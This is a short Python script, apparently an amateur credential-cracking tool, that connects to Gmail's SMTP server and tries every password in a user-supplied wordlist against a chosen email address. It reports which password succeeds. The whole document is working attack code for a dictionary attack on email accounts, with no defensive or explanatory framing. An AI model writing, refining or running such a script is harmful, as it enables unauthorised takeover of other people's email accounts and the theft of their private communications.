import smtplib
one = smtplib.SMTP ("smtp.gmail.com" , 587)
one. ehlo ()
one. starttls ()

user = input ('Inter Your E-Mail: ')
passwordlist = input ('Inter Your Password List: ')
passwordlist = open (passwordlist , 'r')
for passw in passwordlist :
    try :
        one. login (user , passw)
        print ('Password is: ' , passw)
        break
    except smtplib.SMTPAuthenticationError :
        print ('Password Not Found ' , passw)